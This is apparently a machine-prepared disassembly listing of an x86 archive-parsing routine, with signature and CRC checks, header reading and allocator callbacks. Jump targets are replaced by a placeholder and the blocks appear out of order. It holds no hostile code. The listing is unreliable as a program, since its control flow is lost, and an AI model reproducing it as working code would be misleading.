mov [ ebp - 0x20 ] eax
test ecx ecx
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x38 ]
jb r-xdata
add [ edi ] ecx
sub eax ecx
mov [ edi + 0x4 ] eax
xor eax eax
ja r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
shl eax 0x2
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0x18 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
je r-xdata
cmp ebx 0x9
jne r-xdata
mov ebx [ ebp + 0x8 ]
add ebx 0xc
mov [ ebp - 0x1c ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebx ] eax
add [ ecx ] eax
inc esi
add ebx 0x28
cmp esi [ ebp - 0xc ]
jb r-xdata
cmp eax 0x80000000
jae r-xdata
mov eax 0x10
jmp r-xdata
cmp ecx eax
jbe r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov edx [ edx ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ ebp - 0x28 ] 0x9
jne r-xdata
lea edx [ ebp - 0x38 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
jmp r-xdata
test ecx ecx
ja r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov ecx [ ecx ]
mov esi [ esi ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
mov ebx [ ebx + 0x18 ]
xorps xmm0 xmm0
movlpd [ ebp - 0x38 ] xmm0
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x28 ]
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] eax
test esi esi
jne r-xdata
jb r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
add eax 0x1c
mov edx ecx
xor edi edi
mov [ esi + eax ] 0x0
inc eax
mov [ ecx ] 0x0
lea ecx [ ecx + 0x4 ]
cmp eax edx
jb r-xdata
mov ebx [ ebp - 0x28 ]
xorps xmm0 xmm0
movlpd [ ebp - 0x30 ] xmm0
mov esi [ ebp - 0x30 ]
mov ecx [ ebp - 0x2c ]
dec edx
js r-xdata
cmp ebx 0x1
jbe r-xdata
cmp eax 0x4000000
jae r-xdata
or ebx eax
je r-xdata
test eax eax
jne r-xdata
add edi ecx
cmp [ eax ] 0x0
jne r-xdata
inc eax
add ebx 0x28
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ecx
jb r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x38 ]
mov esi 0x1
mov [ ebp - 0x10 ] eax
xor eax eax
lea edx [ ebp - 0x40 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
xor edx edx
xor ebx ebx
mov [ ebp + 0xc ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x10 ] edx
test eax eax
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx 0x1
jne r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x18 ]
add eax 0x28
dec edx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax + edx * 8 ]
mov ecx [ eax + edx * 8 + 0x4 ]
jmp r-xdata
mov eax [ ebx - 0x8 ]
add eax 0x4
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x40 ]
inc [ ebp - 0x8 ]
inc esi
add [ ebp - 0x10 ] edx
mov [ eax + ecx * 8 ] edx
mov ecx [ ebp - 0x3c ]
adc [ ebp - 0x14 ] ecx
mov [ eax + edi * 8 + 0x4 ] ecx
mov edi [ ebp - 0x18 ]
cmp esi ebx
jb r-xdata
cmp [ ebp - 0x3c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ ebp - 0x40 ]
jb r-xdata
mov [ ebp - 0x8 ] 0x10
mov ebx [ ebp - 0x8 ]
jmp r-xdata
dec eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
inc eax
mov cl [ eax - 0x1 ]
mov [ edi ] eax
test cl cl
jne r-xdata
sub esi [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ eax ]
sbb ecx [ ebp - 0x14 ]
mov [ eax + edx * 8 ] esi
mov esi [ ebp - 0x24 ]
mov [ eax + edx * 8 + 0x4 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
inc edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
test ecx ecx
js r-xdata
inc ecx
add eax 0x8
cmp ecx esi
jb r-xdata
lea edx [ ebp - 0x40 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
jmp r-xdata
add [ edi ] ecx
sub eax ecx
mov [ edi + 0x4 ] eax
xor eax eax
ja r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax + 0x4 ]
call eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x10
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
call sub_403240
mov ecx eax
add esp 0x8
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
dec edx
jns r-xdata
cmp [ eax ] edx
je r-xdata
mov ebx [ ebp - 0x1c ]
lea ecx [ ebx - 0xc ]
call sub_402b60
mov edx eax
test edx edx
je r-xdata
lea edx [ ebp - 0x28 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
mov eax 0x10
jmp r-xdata
cmp ecx eax
jbe r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax ]
call eax
mov edx eax
add esp 0x8
mov [ ebp + 0xc ] edx
test edx edx
jne r-xdata
xor edx edx
xor ecx ecx
mov [ ebp + 0xc ] edx
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp + 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov ebx ecx
jmp r-xdata
xor ecx ecx
test esi esi
je r-xdata
mov ebx [ ebp - 0x28 ]
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x2
mov ebx [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp ebx 0xa
jne r-xdata
xor ecx ecx
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx eax
mov edi edx
mov edx ecx
shr ecx 0x2
mov eax 0x1010101
[ edi ]
mov ecx edx
mov edx [ ebp + 0xc ]
and ecx 0x3
[ edi ]
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ebx
test ecx ecx
je r-xdata
mov [ ebp - 0x1c ] ecx
jmp r-xdata
shl eax 0x2
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax ]
call eax
mov ecx eax
add esp 0x8
mov [ ebp - 0x10 ] ecx
test ecx ecx
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
add eax 0x1c
mov [ ebp - 0x14 ] eax
mov edi ecx
mov [ ebp - 0x20 ] ecx
cmp [ eax + edx ] bl
je r-xdata
mov edx [ ebp + 0xc ]
lea ebx [ eax + 0x2 ]
jmp r-xdata
test edx edx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
add ecx 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov [ ecx ] ebx
xor edx edx
lea esp [ esp ]
add eax 0x28
dec edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax ]
lea ecx [ eax + esi * 4 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edi eax
lea ebx [ ebx ]
mov eax [ ebp + 0x14 ]
inc esi
mov eax [ eax ]
mov [ esi + eax - 0x1 ] dl
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov [ ecx + esi * 4 - 0x4 ] eax
jmp r-xdata
mov ebx 0x10
jmp r-xdata
dec eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
inc eax
mov cl [ eax - 0x1 ]
mov [ edi ] eax
movzx eax cl
mov ecx edx
shl eax cl
mov ecx [ ebp - 0x1c ]
add edx 0x8
or [ ecx ] eax
cmp edx 0x20
jl r-xdata
mov edx [ eax + 0x8 ]
cmp edx 0x1
jne r-xdata
mov edi [ ebp - 0x18 ]
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
inc esi
mov al [ eax + ebx ]
mov [ edi + esi - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc ebx
mov eax [ eax + ebx * 4 - 0x4 ]
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0xc ]
sub_404590
push ebp
mov ebp esp
sub esp 0x14
push esi
mov [ ebp - 0x4 ] edx
push edi
lea edx [ ebp - 0x10 ]
mov edi ecx
call sub_403010
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax 0x4
cmp edx [ ebp - 0xc ]
jne r-xdata
cmp ecx 0x8
ja r-xdata
jmp [ ecx * 4 + jump_table_404660 ]
push [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
push eax
lea eax [ esi + 0x4 ]
push eax
lea eax [ esi + 0x14 ]
push esi
push eax
mov ecx edi
call sub_4033c0
add esp 0x14
jmp r-xdata
push [ ebp + 0x20 ]
lea eax [ esi + 0xc ]
push [ ebp + 0x1c ]
lea edx [ esi + 0x18 ]
push eax
mov ecx edi
call sub_403ba0
add esp 0xc
jmp r-xdata
push [ ebp + 0x20 ]
mov edx [ esi + 0x18 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0xc ]
call sub_403fa0
add esp 0x18
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
mov ecx edi
call sub_403010
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov eax ecx
cdq
cmp eax ecx
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_404690
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor eax eax
xor esi esi
push edi
mov edi [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov [ edi + esi * 4 ] eax
xor esi esi
cmp eax edx
mov ecx 0x10
pop edi
cmove ecx esi
pop esi
mov eax ecx
pop ebx
pop ebp
retn
mov [ edi + esi * 4 ] eax
pop edi
pop esi
mov eax 0x10
pop ebx
pop ebp
retn
cmp [ ecx + eax * 2 ] 0x0
jne r-xdata
inc eax
jmp r-xdata
cmp [ ecx + eax * 2 + 0x1 ] 0x0
je r-xdata
cmp eax edx
jae r-xdata
inc esi
inc eax
cmp esi ebx
jb r-xdata
sub_4046f0
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
mov ebx edx
push edi
mov edi ecx
lea edx [ ebp - 0x18 ]
mov ecx ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_403010
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x4
jne r-xdata
test ecx ecx
jne r-xdata
mov eax edx
or eax ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_403150
test eax eax
jne r-xdata
cmp edx 0x5
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x24 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x20 ]
lea edx [ edi + 0x28 ]
push [ ebp + 0x10 ]
mov ecx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push edi
call sub_404590
add esp 0x1c
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
mov ecx ebx
call sub_403010
test eax eax
jne r-xdata
mov eax 0x10
test ecx ecx
jne r-xdata
mov eax [ edi + 0x20 ]
add [ edi + 0x28 ] eax
mov eax [ edi + 0x24 ]
lea edx [ ebp - 0x18 ]
adc [ edi + 0x2c ] eax
mov ecx ebx
call sub_403010
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
lea edx [ ebp - 0x4 ]
mov ecx ebx
call sub_4030d0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x4 ]
mov [ edi + 0x1c ] esi
test esi esi
jne r-xdata
mov eax esi
shl eax 0x5
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ edi + 0x10 ] eax
test esi esi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov ecx ebx
call sub_403010
test eax eax
jne r-xdata
add eax 0x19
mov ecx esi
mov edi [ ebp - 0x28 ]
mov eax edi
or eax [ ebp - 0x24 ]
je r-xdata
mov [ eax - 0x1 ] 0x1
mov [ eax + 0x3 ] 0x0
lea eax [ eax + 0x20 ]
dec ecx
jne r-xdata
xor ecx ecx
xor ebx ebx
xor edi edi
mov [ ebp - 0x10 ] ecx
test esi esi
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
call sub_403010
test eax eax
jne r-xdata
mov edx [ ebp + 0x20 ]
mov ecx [ ebp - 0xc ]
call sub_402dd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
add edx 0x18
jmp r-xdata
cmp [ ebp - 0x1c ] eax
ja r-xdata
mov eax [ ebp + 0x14 ]
mov [ edx + 0x2 ] 0x0
mov eax [ eax ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jb r-xdata
cmp [ eax + edi ] 0x0
sete al
mov [ edx ] al
test al al
je r-xdata
mov [ edx ] 0x1
jmp r-xdata
mov eax edi
cdq
cmp eax edi
jne r-xdata
cmp ecx [ ebx + 0x4 ]
ja r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx + 0x1 ] 0x0
mov ecx [ eax ]
inc ebx
mov eax [ ecx + ebx * 8 - 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ecx + ebx * 8 - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov eax [ eax + ebx * 4 - 0x4 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov al [ ebx + eax - 0x1 ]
mov [ edx + 0x3 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
push ecx
cmp edx [ ebp - 0x24 ]
jne r-xdata
cmp [ eax + ecx ] 0x0
sete al
mov [ edx + 0x1 ] al
mov [ edx + 0x1 ] 0x1
jmp r-xdata
inc edi
add edx 0x20
cmp edi esi
jb r-xdata
lea edx [ ebp - 0x28 ]
mov ecx ebx
call sub_403010
test eax eax
jne r-xdata
lea eax [ edi - 0xe ]
cmp eax 0x7
ja r-xdata
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ edx - 0x10 ] 0x0
mov [ edx - 0xc ] 0x0
mov [ edx - 0x8 ] 0x0
mov [ edx + 0x3 ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
jmp [ eax * 4 + jump_table_404bb4 ]
mov ecx ebx
call sub_4035a0
test eax eax
jne r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp + 0x14 ]
push edi
mov edx esi
mov ecx ebx
call sub_403240
add esp 0x8
test eax eax
jne r-xdata
push [ ebp + 0x24 ]
mov edx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx ebx
call sub_403240
jmp r-xdata
push [ ebp + 0x24 ]
mov edx esi
push [ ebp + 0x1c ]
mov ecx ebx
call sub_4032c0
add esp 0x8
test eax eax
jne r-xdata
push [ ebp + 0x24 ]
mov edx esi
push [ ebp + 0x1c ]
mov ecx ebx
call sub_4032c0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
mov [ ebp - 0x14 ] eax
test al 0x1
jne r-xdata
xor edx edx
mov [ ebp - 0x10 ] edx
test esi esi
je r-xdata
add esp 0x8
test eax eax
jne r-xdata
mov ecx ebx
call sub_4035a0
test eax eax
jne r-xdata
mov ecx ebx
call sub_4035a0
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
push [ ebp + 0x20 ]
lea ecx [ edi + 0x44 ]
mov edx eax
call sub_401a90
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi ]
lea esp [ esp ]
xor edi edi
test esi esi
je r-xdata
xor edi edi
test esi esi
je r-xdata
lea eax [ esi + 0x1 ]
test eax eax
jne r-xdata
inc eax
cmp eax esi
jb r-xdata
inc edx
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x24 ]
push [ esi ]
mov eax [ edi + 0x4 ]
push edi
call eax
add esp 0x8
mov [ esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x8 ]
add esi 0x14
mov edi edi
mov esi [ ebp + 0x1c ]
mov eax [ ebp + 0x24 ]
push [ esi ]
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x8
mov [ esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x8 ]
add esi 0x4
lea eax [ esi * 4 + 0x4 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ edi + 0x40 ] eax
test eax eax
je r-xdata
mov [ edi + 0x40 ] eax
jmp r-xdata
cmp [ ecx + eax ] 0x0
je r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
inc edi
add esi 0x20
cmp edi [ ebp - 0x4 ]
jb r-xdata
mov edx esi
mov ecx ebx
call sub_402fc0
test eax eax
jne r-xdata
inc edi
add esi 0x20
cmp edi [ ebp - 0x4 ]
jb r-xdata
mov ecx ebx
call sub_402fc0
test eax eax
jne r-xdata
mov edi [ ebp - 0x14 ]
mov esi [ ebx ]
mov eax [ ebp - 0xc ]
push edi
push esi
push [ eax + 0x44 ]
call sub_41a1a0
mov eax [ ebp - 0xc ]
add esp 0xc
push [ eax + 0x40 ]
mov edx edi
push [ ebp - 0x4 ]
shr edx 0x1
mov ecx esi
call sub_404690
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
mov al [ edi + eax ]
mov [ esi + 0x9 ] al
mov [ esi ] 0x0
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea edx [ esi - 0x4 ]
mov eax [ eax ]
mov al [ edi + eax ]
mov [ esi + 0x18 ] al
mov [ esi ] 0x0
mov [ edx ] 0x0
test al al
je r-xdata
mov edx esi
mov ecx ebx
call sub_402fc0
test eax eax
jne r-xdata
push eax
push edi
jmp r-xdata
mov ecx ebx
call sub_403120
sub_404be0
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
call sub_4046f0
push [ ebp - 0x4 ]
mov ecx [ edi + 0x4 ]
push edi
mov esi eax
call ecx
push [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
push edi
call eax
push [ ebp - 0xc ]
mov eax [ edi + 0x4 ]
push edi
call eax
push [ ebp - 0x10 ]
mov eax [ edi + 0x4 ]
push edi
call eax
mov eax [ edi + 0x4 ]
add esp 0x40
push [ ebp - 0x14 ]
push edi
call eax
push [ ebp - 0x18 ]
mov eax [ edi + 0x4 ]
push edi
call eax
add esp 0x10
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_404c80
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
push edi
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp + 0x24 ]
push ecx
push ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
push eax
mov edi edx
mov edx [ ebp + 0x1c ]
push edx
push esi
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x1c ] ecx
push ebx
lea edx [ ebp - 0x10 ]
mov ecx edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x14 ] 0x0
call sub_404590
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x10 ]
add esi [ ebp + 0xc ]
mov edi [ ebp - 0xc ]
adc edi [ ebp + 0x10 ]
cmp [ ebx + 0x18 ] 0x1
je r-xdata
mov ebx [ ebx + 0xc ]
mov ecx ebx
call sub_402c00
mov [ ebp - 0x14 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
call eax
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_401a90
add esp 0x4
test eax eax
jne r-xdata
push [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x20 ]
push [ eax ]
mov edx [ ebp - 0x24 ]
push edi
mov edx [ edx ]
push esi
push ecx
mov ecx ebx
call sub_4027e0
add esp 0x18
test eax eax
jne r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x1c ] eax
je r-xdata
xor eax eax
mov eax [ ebp - 0x18 ]
push rw-data
push [ ebp - 0x14 ]
mov edx [ eax ]
or ecx 0xffffffff
call [ rw-data ]
not eax
cmp eax [ ebx + 0x20 ]
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_404dd0
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
mov edi [ ebp + 0x14 ]
push edi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_404c80
mov edx edi
lea ecx [ ebp - 0x2c ]
mov esi eax
call sub_402c50
push [ ebp - 0x4 ]
mov ecx [ edi + 0x4 ]
push edi
call ecx
push [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
push edi
call eax
push [ ebp - 0xc ]
mov eax [ edi + 0x4 ]
push edi
call eax
add esp 0x38
mov eax esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_404e80
push ebp
mov ebp esp
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0xc ]
push edi
mov [ ebp - 0x3c ] eax
mov ebx edx
push 0x1
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebx + 0xc ]
xorps xmm0 xmm0
push ebx
mov [ ebp - 0x5c ] ecx
movlpd [ ebp - 0x38 ] xmm0
call eax
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov esi 0x20
lea edi [ ebp - 0x24 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x8 ]
push edi
push ebx
mov [ ebp - 0x2c ] esi
call eax
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x2c ]
test eax eax
je r-xdata
mov eax 0x11
add edi eax
sub esi eax
jne r-xdata
xor ecx ecx
lea esp [ esp ]
inc ecx
cmp ecx 0x6
jb r-xdata
mov al [ ebp + ecx - 0x24 ]
cmp al [ ecx + rw-data ]
jne r-xdata
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x5c ]
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x34 ]
add ecx 0x20
adc eax 0x0
mov [ edx + 0x20 ] ecx
push rw-data
mov [ edx + 0x24 ] eax
push 0x14
lea edx [ ebp - 0x18 ]
or ecx 0xffffffff
mov [ ebp - 0x54 ] edi
call [ rw-data ]
not eax
cmp eax [ ebp - 0x1c ]
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp edi edi
jne r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x60 ]
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x44 ]
add edi esi
adc eax ecx
mov [ ebp - 0x60 ] eax
cmp ecx eax
ja r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
jb r-xdata
mov edx edi
add edx 0x20
adc eax 0x0
cmp ecx eax
ja r-xdata
cmp esi edi
ja r-xdata
jb r-xdata
push 0x2
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebx + 0xc ]
xorps xmm0 xmm0
push ebx
movlpd [ ebp - 0x30 ] xmm0
call eax
add esp 0xc
test eax eax
jne r-xdata
cmp esi edx
ja r-xdata
add esi [ ebp - 0x38 ]
mov ecx [ ebp - 0x44 ]
adc ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x2c ]
cmp eax ecx
jb r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x30 ]
ja r-xdata
add esi 0x20
adc ecx 0x0
cmp eax ecx
jb r-xdata
cmp edx esi
